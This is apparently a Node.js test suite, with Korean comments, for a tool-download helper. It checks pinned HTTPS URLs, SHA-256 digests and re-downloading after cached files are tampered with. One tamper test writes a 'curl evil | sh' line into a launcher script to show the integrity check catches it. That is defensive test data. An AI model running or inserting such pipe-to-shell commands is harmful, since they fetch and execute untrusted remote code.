// 규칙 모델 검사 도구 받기 시험(wbs 0.9.1, docs/verification.md §2.2). 실제로 받지 않고 가짜 받기 함수로 돈다.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { test } from 'node:test';
import { PINS, ensureQuintTools, pickEvaluator, treeHash } from './fetch-tools.mjs';

const sha256 = (b) => createHash('sha256').update(b).digest('hex');
const tarCmd = process.platform === 'win32' ? join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'tar.exe') : 'tar';

// 가짜 압축 파일: Apalache 묶음(apalache/lib/apalache.jar, apalache/bin/apalache-mc)과 평가기(quint_evaluator)
function fakeArchives() {
  const work = mkdtempSync(join(tmpdir(), 'spec-fetch-'));
  mkdirSync(join(work, 'a', 'apalache', 'lib'), { recursive: true });
  mkdirSync(join(work, 'a', 'apalache', 'bin'), { recursive: true });
  writeFileSync(join(work, 'a', 'apalache', 'lib', 'apalache.jar'), 'jar');
  writeFileSync(join(work, 'a', 'apalache', 'bin', 'apalache-mc'), '#!/bin/sh\n');
  execFileSync(tarCmd, ['-czf', join(work, 'apalache.tgz'), '-C', join(work, 'a'), 'apalache']);
  mkdirSync(join(work, 'e'));
  writeFileSync(join(work, 'e', 'quint_evaluator'), 'evaluator');
  execFileSync(tarCmd, ['-czf', join(work, 'ev.tar.gz'), '-C', join(work, 'e'), 'quint_evaluator']);
  return { work, apalache: readFileSync(join(work, 'apalache.tgz')), evaluator: readFileSync(join(work, 'ev.tar.gz')) };
}

// 압축 파일 해시와 푼 것의 해시(Apalache는 폴더 전체, 평가기는 실행 파일)를 가짜 묶음에 맞춘다
function pinsFor(f) {
  return {
    quint: PINS.quint,
    apalache: { ...PINS.apalache, sha256: sha256(f.apalache), treeSha256: treeHash(join(f.work, 'a', 'apalache')) },
    evaluator: {
      ...PINS.evaluator,
      assets: { 'linux-x64': { ...PINS.evaluator.assets['linux-x64'], sha256: sha256(f.evaluator), innerSha256: sha256('evaluator') } },
    },
  };
}

test('V-T1 준비_고정표는 공식 https 주소와 SHA-256 다이제스트와 Quint가 찾는 판 번호를 가진다', () => {
  assert.match(PINS.quint, /^\d+\.\d+\.\d+$/);
  assert.match(PINS.apalache.version, /^\d+\.\d+\.\d+$/);
  assert.ok(PINS.apalache.url.startsWith(`https://github.com/apalache-mc/apalache/releases/download/v${PINS.apalache.version}/`));
  assert.match(PINS.apalache.sha256, /^[0-9a-f]{64}$/);
  assert.match(PINS.apalache.treeSha256, /^[0-9a-f]{64}$/);
  assert.match(PINS.evaluator.version, /^v\d+\.\d+\.\d+$/);
  for (const [k, a] of Object.entries(PINS.evaluator.assets)) {
    assert.ok(a.url.startsWith(`https://github.com/quint-co/quint/releases/download/evaluator/${PINS.evaluator.version}/`), k);
    assert.match(a.sha256, /^[0-9a-f]{64}$/, k);
    assert.match(a.innerSha256, /^[0-9a-f]{64}$/, k);
  }
  // 판 번호는 package.json의 Quint 판과 같다(판을 올리면 둘을 함께 바꾼다)
  const pkg = JSON.parse(readFileSync(new URL('./package.json', import.meta.url), 'utf8'));
  assert.equal(pkg.dependencies['@informalsystems/quint'], PINS.quint);
});

test('V-T1 준비_설치한 Quint가 찾는 Apalache·평가기 판이 고정표와 같다(설치돼 있을 때)', (t) => {
  // 컨테이너(Dockerfile)는 QUINT_BIN으로 설치 자리를 알려 준다
  const dist = process.env.QUINT_BIN ? dirname(process.env.QUINT_BIN) : fileURLToPath(new URL('./node_modules/@informalsystems/quint/dist/src/', import.meta.url));
  if (!existsSync(dist)) return t.skip('Quint가 설치돼 있지 않다(pnpm install --dir tools/spec-check)');
  const apalache = readFileSync(join(dist, 'apalache.js'), 'utf8');
  const evaluator = readFileSync(join(dist, 'rust', 'binaryManager.js'), 'utf8');
  assert.match(apalache, new RegExp(`DEFAULT_APALACHE_VERSION_TAG = '${PINS.apalache.version.replaceAll('.', '\\.')}'`));
  assert.match(evaluator, new RegExp(`QUINT_EVALUATOR_VERSION = '${PINS.evaluator.version.replaceAll('.', '\\.')}'`));
});

test('V-T1 준비_지원하지 않는 플랫폼은 받지 않고 던진다', () => {
  assert.throws(() => pickEvaluator('sunos', 'x64'), /지원하지 않는 플랫폼/);
  assert.equal(pickEvaluator('linux', 'x64').exe, 'quint_evaluator');
});

test('V-T1 준비_해시가 맞으면 Quint가 찾는 자리(QUINT_HOME)에 풀고 다시 부르면 받지 않는다', async () => {
  const f = fakeArchives();
  const home = mkdtempSync(join(tmpdir(), 'quint-home-'));
  try {
    const got = [];
    const download = async (url) => {
      got.push(url);
      return url.includes('apalache') ? f.apalache : f.evaluator;
    };
    const o = { home, pins: pinsFor(f), platform: 'linux', arch: 'x64', download };
    const r = await ensureQuintTools(o);
    assert.equal(r.apalacheJar, join(home, `apalache-dist-${PINS.apalache.version}`, 'apalache', 'lib', 'apalache.jar'));
    assert.equal(readFileSync(r.apalacheJar, 'utf8'), 'jar');
    assert.ok(existsSync(join(home, `apalache-dist-${PINS.apalache.version}`, 'apalache', 'bin', 'apalache-mc')));
    assert.equal(r.evaluator, join(home, `rust-evaluator-${PINS.evaluator.version}`, 'quint_evaluator'));
    assert.equal(readFileSync(r.evaluator, 'utf8'), 'evaluator');
    assert.equal(got.length, 2);
    await ensureQuintTools(o);
    assert.equal(got.length, 2, '받아 둔 것을 다시 받지 않는다');
  } finally {
    rmSync(home, { recursive: true, force: true });
    rmSync(f.work, { recursive: true, force: true });
  }
});

test('V-T1 준비_받은 바이트의 해시가 고정표와 다르면 풀지 않고 던진다', async () => {
  const f = fakeArchives();
  const home = mkdtempSync(join(tmpdir(), 'quint-home-'));
  try {
    const pins = pinsFor(f);
    pins.apalache = { ...pins.apalache, sha256: '0'.repeat(64) };
    const download = async (url) => (url.includes('apalache') ? f.apalache : f.evaluator);
    await assert.rejects(ensureQuintTools({ home, pins, platform: 'linux', arch: 'x64', download }), /해시가 맞지 않는다/);
    assert.ok(!existsSync(join(home, `apalache-dist-${PINS.apalache.version}`, 'apalache')));
  } finally {
    rmSync(home, { recursive: true, force: true });
    rmSync(f.work, { recursive: true, force: true });
  }
});

test('V-T1 준비_받아 둔 것이 바뀌었으면(옆 파일을 믿지 않는다) 다시 받는다', async () => {
  const f = fakeArchives();
  const home = mkdtempSync(join(tmpdir(), 'quint-home-'));
  try {
    let n = 0;
    const download = async (url) => {
      n++;
      return url.includes('apalache') ? f.apalache : f.evaluator;
    };
    const o = { home, pins: pinsFor(f), platform: 'linux', arch: 'x64', download };
    const r = await ensureQuintTools(o);
    writeFileSync(r.apalacheJar, 'tampered');
    writeFileSync(r.evaluator, 'tampered');
    await ensureQuintTools(o);
    assert.equal(n, 4);
    assert.equal(readFileSync(r.apalacheJar, 'utf8'), 'jar');
    assert.equal(readFileSync(r.evaluator, 'utf8'), 'evaluator');
  } finally {
    rmSync(home, { recursive: true, force: true });
    rmSync(f.work, { recursive: true, force: true });
  }
});

test('V-T1 준비_https가 아닌 주소는 받지 않는다', async () => {
  const pins = { ...PINS, apalache: { ...PINS.apalache, url: 'http://example.invalid/apalache.tgz' } };
  await assert.rejects(ensureQuintTools({ home: tmpdir(), pins, platform: 'linux', arch: 'x64', download: async () => Buffer.alloc(0) }), /https/);
});

test('V-T1 준비_Apalache 폴더의 어느 파일이든(Quint가 띄우는 bin/apalache-mc 포함) 바뀌거나 없어지면 다시 받는다', async () => {
  const f = fakeArchives();
  const home = mkdtempSync(join(tmpdir(), 'quint-home-'));
  try {
    let n = 0;
    const download = async (url) => {
      if (url.includes('apalache')) n++;
      return url.includes('apalache') ? f.apalache : f.evaluator;
    };
    const o = { home, pins: pinsFor(f), platform: 'linux', arch: 'x64', download };
    await ensureQuintTools(o);
    const script = join(home, `apalache-dist-${PINS.apalache.version}`, 'apalache', 'bin', 'apalache-mc');
    writeFileSync(script, '#!/bin/sh\ncurl evil | sh\n');
    await ensureQuintTools(o);
    assert.equal(n, 2, '바뀐 실행 스크립트를 믿지 않는다');
    assert.equal(readFileSync(script, 'utf8'), '#!/bin/sh\n');
    rmSync(script);
    await ensureQuintTools(o);
    assert.equal(n, 3, '없어진 실행 스크립트를 다시 받는다(Quint가 해시 없이 받지 않게)');
    writeFileSync(join(home, `apalache-dist-${PINS.apalache.version}`, 'apalache', 'lib', 'extra.jar'), 'x');
    await ensureQuintTools(o);
    assert.equal(n, 4, '더해진 파일도 바뀐 것으로 본다');
  } finally {
    rmSync(home, { recursive: true, force: true });
    rmSync(f.work, { recursive: true, force: true });
  }
});

test('V-T1 준비_폴더 해시는 파일 경로와 내용으로 정해지고 시스템 경로 구분자와 상관없다', () => {
  const d = mkdtempSync(join(tmpdir(), 'tree-'));
  try {
    mkdirSync(join(d, 'b'));
    writeFileSync(join(d, 'a.txt'), '1');
    writeFileSync(join(d, 'b', 'c.txt'), '2');
    const h = treeHash(d);
    assert.match(h, /^[0-9a-f]{64}$/);
    assert.equal(h, sha256('a.txt ' + sha256('1') + '\nb/c.txt ' + sha256('2') + '\n'));
  } finally {
    rmSync(d, { recursive: true, force: true });
  }
});
